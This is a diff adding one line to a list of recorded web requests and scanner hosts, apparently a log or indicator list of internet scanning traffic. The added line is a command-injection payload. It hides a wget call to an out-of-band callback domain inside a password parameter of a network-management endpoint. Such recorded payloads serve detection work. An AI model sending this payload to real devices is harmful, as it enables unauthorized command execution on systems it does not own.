@@ -23895,3 +23895,4 @@ ipv4-internet.yandex.net:443
 /lezcxubd.php?Fox=d3wL7
 http://141.76.94.18:80/pscan
 p-scanner.research.netd.cs.tu-dresden.de:443
+/Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://d0m448i93sf15f65rb5gg41zpobn3xgpp.oast.live)
